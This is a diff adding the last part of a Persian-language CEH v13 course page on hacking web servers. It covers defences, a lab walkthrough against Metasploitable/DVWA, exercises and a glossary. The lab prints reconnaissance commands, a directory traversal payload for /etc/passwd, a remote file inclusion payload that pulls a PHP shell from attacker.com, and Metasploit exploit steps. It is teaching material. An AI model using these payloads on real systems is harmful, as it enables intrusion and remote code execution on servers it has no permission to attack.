+            <li><b>به‌روزرسانی منظم:</b> نصب وصله‌های امنیتی برای وب‌سرور و ماژول‌ها.</li>
+            <li><b>پیکربندی امن:</b> غیرفعال کردن Directory Listing، محدود کردن دسترسی به فایل‌های حساس.</li>
+            <li><b>استفاده از HTTPS:</b> رمزنگاری ارتباطات با SSL/TLS قوی.</li>
+            <li><b>استفاده از WAF (Web Application Firewall):</b> محافظت در برابر حملات لایه کاربرد.</li>
+            <li><b>محدود کردن دسترسی:</b> استفاده از IP Whitelist و Blacklist.</li>
+            <li><b>آموزش توسعه‌دهندگان:</b> آموزش کدنویسی امن برای جلوگیری از آسیب‌پذیری‌های رایج.</li>
+            <li><b>پشتیبان‌گیری منظم:</b> تهیه نسخه پشتیبان از فایل‌ها و تنظیمات.</li>
+        </ul>
+
+        <h3>📌 اقدامات خاص برای هر نوع حمله:</h3>
+        <ul>
+            <li><b>در برابر Directory Traversal:</b> فیلتر کردن ورودی‌ها، استفاده از مسیرهای مطلق.</li>
+            <li><b>در برابر File Inclusion:</b> غیرفعال کردن allow_url_include، فیلتر کردن ورودی‌ها.</li>
+            <li><b>در برابر Misconfiguration:</b> ممیزی منظم پیکربندی، استفاده از ابزارهای ارزیابی.</li>
+            <li><b>در برابر Brute Force:</b> محدود کردن تعداد تلاش‌های ورود، استفاده از CAPTCHA.</li>
+            <li><b>در برابر DoS:</b> محدود کردن نرخ درخواست‌ها، استفاده از CDN.</li>
+        </ul>
+
+        <div class="highlight-box">
+            <b>💡 نکته:</b> بهترین دفاع در برابر حملات وب‌سرور، ترکیبی از به‌روزرسانی، پیکربندی امن و آموزش است.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱۴: کارگاه عملی -->
+    <!-- ============================================================ -->
+    <div class="card" id="lab-exercise">
+        <h2>🧪 کارگاه عملی – هک وب‌سرور</h2>
+        <p>
+            در این کارگاه، شما با تکنیک‌ها و ابزارهای هک وب‌سرور آشنا خواهید شد و یک سناریوی کامل از نفوذ به وب‌سرور را در محیط آزمایشگاهی پیاده‌سازی می‌کنید.
+        </p>
+
+        <h3>🎯 هدف کارگاه:</h3>
+        <ul>
+            <li>شناسایی وب‌سرور با Nmap و WhatWeb.</li>
+            <li>اسکن آسیب‌پذیری با Nikto و Gobuster.</li>
+            <li>اجرای Directory Traversal.</li>
+            <li>اجرای LFI و RFI.</li>
+            <li>بهره‌برداری از آسیب‌پذیری با Metasploit.</li>
+            <li>مقابله با حملات.</li>
+        </ul>
+
+        <h3>🖥️ محیط مورد نیاز:</h3>
+        <ul>
+            <li><b>حمله‌کننده:</b> Kali Linux</li>
+            <li><b>هدف:</b> Metasploitable 2 یا یک وب‌سرور آسیب‌پذیر (مثل DVWA)</li>
+            <li><b>ابزارها:</b> Nmap, WhatWeb, Nikto, Gobuster, Burp Suite, Metasploit</li>
+        </ul>
+
+        <h3>📝 سناریوی گام‌به‌گام:</h3>
+
+        <h4>مرحله ۱: شناسایی وب‌سرور</h4>
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># اسکن پورت با Nmap
+nmap -sV -p 80,443 192.168.1.101
+
+# شناسایی با WhatWeb
+whatweb http://192.168.1.101</code></pre>
+        </div>
+        <p><b>تحلیل:</b> نوع و نسخه وب‌سرور را شناسایی کنید.</p>
+
+        <h4>مرحله ۲: اسکن دایرکتوری با Gobuster</h4>
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># اسکن دایرکتوری‌های مخفی
+gobuster dir -u http://192.168.1.101 -w /usr/share/wordlists/dirb/common.txt</code></pre>
+        </div>
+        <p><b>تحلیل:</b> دایرکتوری‌های پیدا شده را بررسی کنید (مثل /admin, /uploads).</p>
+
+        <h4>مرحله ۳: اسکن آسیب‌پذیری با Nikto</h4>
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># اسکن کامل وب‌سرور
+nikto -h http://192.168.1.101</code></pre>
+        </div>
+        <p><b>تحلیل:</b> آسیب‌پذیری‌های شناسایی شده را لیست کنید.</p>
+
+        <h4>مرحله ۴: Directory Traversal</h4>
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># امتحان Directory Traversal در یک صفحه آسیب‌پذیر
+# (مثلاً در DVWA: http://192.168.1.101/dvwa/vulnerabilities/fi/?page=../../../etc/passwd)</code></pre>
+        </div>
+        <p><b>تحلیل:</b> محتوای فایل /etc/passwd را مشاهده کنید.</p>
+
+        <h4>مرحله ۵: File Inclusion (RFI)</h4>
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># در صورت وجود RFI، یک شل PHP از سرور مهاجم تزریق کنید
+# http://192.168.1.101/page.php?file=http://attacker.com/shell.txt</code></pre>
+        </div>
+        <p><b>تحلیل:</b> اگر موفق شد، شل اجرا شده و دسترسی کامل به سرور خواهید داشت.</p>
+
+        <h4>مرحله ۶: بهره‌برداری با Metasploit</h4>
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># استفاده از Metasploit برای بهره‌برداری از آسیب‌پذیری
+msfconsole
+search apache
+use exploit/multi/http/apache_struts_exec
+set RHOST 192.168.1.101
+exploit</code></pre>
+        </div>
+        <p><b>تحلیل:</b> در صورت موفقیت، به یک شل دسترسی پیدا می‌کنید.</p>
+
+        <h4>مرحله ۷: مقابله</h4>
+        <div class="code-block">
+            
+            <pre dir='ltr'><code dir='ltr'># تنظیمات امنیتی در Apache (در فایل .htaccess)
+# جلوگیری از Directory Listing
+Options -Indexes
+
+# محدود کردن دسترسی به فایل‌های حساس
+<FilesMatch "\.(bak|old|sql|log|htaccess)$">
+    Order allow,deny
+    Deny from all
+</FilesMatch></code></pre>
+        </div>
+        <p><b>تحلیل:</b> با اعمال این تنظیمات، بسیاری از حملات خنثی می‌شوند.</p>
+
+        <div class="highlight-box">
+            <b>⏳ تکلیف:</b> تمام مراحل بالا را در محیط آزمایشگاهی خود اجرا کنید و یک گزارش کامل از فرآیند هک وب‌سرور، تشخیص و مقابله تهیه کنید.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱۵: تمرین‌های عملی -->
+    <!-- ============================================================ -->
+    <div class="card" id="practice-exercises">
+        <h2>📝 تمرین‌های عملی</h2>
+        <p>
+            این تمرینات به شما کمک می‌کنند تا مهارت‌های خود در زمینه هک وب‌سرور را تقویت کنید.
+        </p>
+
+        <ul>
+            <li>
+                <b>تمرین ۱ – شناسایی وب‌سرور:</b>
+                <br>با استفاده از Nmap و WhatWeb، نوع و نسخه وب‌سرور یک وب‌سایت واقعی (با مجوز) را شناسایی کنید.
+            </li>
+            <li>
+                <b>تمرین ۲ – اسکن دایرکتوری:</b>
+                <br>با استفاده از Gobuster، دایرکتوری‌های مخفی یک وب‌سایت را پیدا کنید.
+            </li>
+            <li>
+                <b>تمرین ۳ – Directory Traversal:</b>
+                <br>روی یک وب‌سرور آزمایشگاهی، حمله Directory Traversal را پیاده‌سازی کنید و فایل‌های سیستمی را بخوانید.
+            </li>
+            <li>
+                <b>تمرین ۴ – File Inclusion:</b>
+                <br>روی یک وب‌سرور آزمایشگاهی، LFI را پیاده‌سازی کنید و یک شل از طریق لاگ اجرا کنید.
+            </li>
+            <li>
+                <b>تمرین ۵ – اسکن آسیب‌پذیری:</b>
+                <br>با استفاده از Nikto، یک وب‌سرور آزمایشگاهی را اسکن کنید و نتایج را تحلیل کنید.
+            </li>
+        </ul>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- بخش ۱۶: واژه‌نامه تخصصی -->
+    <!-- ============================================================ -->
+    <div class="card" id="glossary">
+        <h2>📖 واژه‌نامه تخصصی (Glossary)</h2>
+        <p>
+            در این بخش، تمام واژه‌های تخصصی این ماژول، همراه با <b>ساختار (ریشه یا مخفف)، تعریف ساده، کاربرد در هک، و یک مثال روزمره</b> توضیح داده شده است.
+        </p>
+
+        <div class="table-responsive">
+            <table>
+                <tr>
+                    <th style="min-width:130px;">واژه</th>
+                    <th style="min-width:100px;">ساختار / مخفف</th>
+                    <th>تعریف ساده</th>
+                    <th>کاربرد در هک</th>
+                    <th>مثال</th>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Web Server</span></td>
+                    <td>—</td>
+                    <td>نرم‌افزاری که صفحات وب را ارائه می‌دهد.</td>
+                    <td>هدف اصلی حملات.</td>
+                    <td>Apache, IIS, Nginx.</td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Directory Traversal</span></td>
+                    <td>—</td>
+                    <td>دسترسی به فایل‌های خارج از ریشه وب.</td>
+                    <td>خواندن فایل‌های سیستمی.</td>
+                    <td><code dir='ltr'>../../../etc/passwd</code></td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">LFI</span></td>
+                    <td><b>L</b>ocal <b>F</b>ile <b>I</b>nclusion</td>
+                    <td>گنجاندن فایل‌های محلی در وب‌سرور.</td>
+                    <td>خواندن فایل‌ها و اجرای کد.</td>
+                    <td><code dir='ltr'>?page=../../etc/passwd</code></td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">RFI</span></td>
+                    <td><b>R</b>emote <b>F</b>ile <b>I</b>nclusion</td>
+                    <td>گنجاندن فایل‌های از راه دور.</td>
+                    <td>اجرای شل از سرور خارجی.</td>
+                    <td><code dir='ltr'>?page=http://attacker.com/shell</code></td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">IIS</span></td>
+                    <td><b>I</b>nternet <b>I</b>nformation <b>S</b>ervices</td>
+                    <td>وب‌سرور مایکروسافت.</td>
+                    <td>هدف حملات به ویندوز.</td>
+                    <td>IIS 6, 7, 8, 10.</td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Apache</span></td>
+                    <td>—</td>
+                    <td>وب‌سرور متن‌باز محبوب.</td>
+                    <td>هدف حملات لینوکس.</td>
+                    <td>Apache 2.4.</td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Nginx</span></td>
+                    <td>—</td>
+                    <td>وب‌سرور پرسرعت و کم‌مصرف.</td>
+                    <td>هدف حملات مدرن.</td>
+                    <td>Nginx 1.18.</td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Misconfiguration</span></td>
+                    <td>—</td>
+                    <td>پیکربندی اشتباه وب‌سرور.</td>
+                    <td>یکی از رایج‌ترین آسیب‌پذیری‌ها.</td>
+                    <td>Directory Listing فعال.</td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">WAF</span></td>
+                    <td><b>W</b>eb <b>A</b>pplication <b>F</b>irewall</td>
+                    <td>فایروال برنامه‌های وب.</td>
+                    <td>محافظت در برابر حملات.</td>
+                    <td>Cloudflare WAF.</td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Nikto</span></td>
+                    <td>—</td>
+                    <td>اسکنر آسیب‌پذیری وب‌سرور.</td>
+                    <td>شناسایی آسیب‌پذیری‌های رایج.</td>
+                    <td><code dir='ltr'>nikto -h example.com</code></td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Gobuster</span></td>
+                    <td>—</td>
+                    <td>ابزار اسکن دایرکتوری.</td>
+                    <td>پیدا کردن مسیرهای مخفی.</td>
+                    <td><code dir='ltr'>gobuster dir -u example.com</code></td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">.htaccess</span></td>
+                    <td>—</td>
+                    <td>فایل پیکربندی Apache.</td>
+                    <td>کنترل دسترسی و تنظیمات.</td>
+                    <td>محدود کردن IP, احراز هویت.</td>
+                </tr>
+
+                <tr>
+                    <td><span dir='ltr' class="glossary-term">Log Injection</span></td>
+                    <td>—</td>
+                    <td>تزریق کد به لاگ‌ها.</td>
+                    <td>اجرای کد از طریق LFI.</td>
+                    <td>تزریق PHP به لاگ Apache.</td>
+                </tr>
+
+            </table>
+        </div>
+
+        <div class="highlight-box">
+            <b>💡 نکته:</b> این واژه‌نامه یک مرجع کامل و سریع برای تمام مفاهیم کلیدی ماژول ۱۳ است. توصیه می‌شود آن را بارها مرور کنید تا اصطلاحات برای شما جا بیفتد.
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- جمع‌بندی نهایی -->
+    <!-- ============================================================ -->
+    <div class="highlight-box">
+        <b>💡 جمع‌بندی ماژول ۱۳:</b>
+        <p>
+            در این ماژول با یکی از مهم‌ترین اهداف حملات سایبری، یعنی <b>وب‌سرورها</b> آشنا شدید:
+        </p>
+        <ul>
+            <li><b>معماری وب‌سرور:</b> اجزا و نحوه عملکرد.</li>
+            <li><b>انواع حملات:</b> Directory Traversal, LFI, RFI, Misconfiguration.</li>
+            <li><b>شناسایی وب‌سرور:</b> با Nmap, WhatWeb, Netcat.</li>
+            <li><b>حملات به IIS, Apache, Nginx:</b> آسیب‌پذیری‌های خاص هر کدام.</li>
+            <li><b>ابزارهای هک وب‌سرور:</b> Nikto, Gobuster, Burp Suite, Metasploit.</li>
+            <li><b>نقش هوش مصنوعی:</b> در شناسایی و بهره‌برداری از آسیب‌پذیری‌ها.</li>
+            <li><b>راه‌های مقابله:</b> به‌روزرسانی، پیکربندی امن، WAF.</li>
+        </ul>
+        <p>
+            <b>📌 گام بعدی:</b> در <a href="../Module_14_Hacking_Web_Applications/index.html" style="color:#2a7de1;font-weight:bold;">ماژول ۱۴ – Hacking Web Applications</a> با حملات به برنامه‌های وب و روش‌های مقابله با آنها آشنا خواهید شد.
+        </p>
+    </div>
+
+    <!-- ===== فوتر ===== -->
+    <div class="footer">
+        <p>دوره جامع CEH V13 | تمامی حقوق برای ارائه‌دهنده محفوظ است.</p>
+        <p style="font-size:0.8rem; margin-top:6px;">ماژول ۱۳ – Hacking Web Servers | آخرین به‌روزرسانی: ۱۴۰۴</p>
+    </div>
+
+    <!-- ===== اسکریپت کپی ===== -->
+    <script>
+        function copyCode(btn) {
+            const codeBlock = btn.closest('.code-block');
+            if (!codeBlock) return;
+            const codeElement = codeBlock.querySelector('code');
+            if (!codeElement) return;
+            const text = codeElement.innerText;
+            navigator.clipboard.writeText(text).then(() => {
+                const original = btn.innerText;
+                btn.innerText = '✅ کپی شد!';
+                setTimeout(() => {
+                    btn.innerText = original;
+                }, 2000);
+            }).catch(() => {
+                alert('خطا در کپی کردن متن');
+            });
+        }
+    </script>
+
+</body>
+</html>
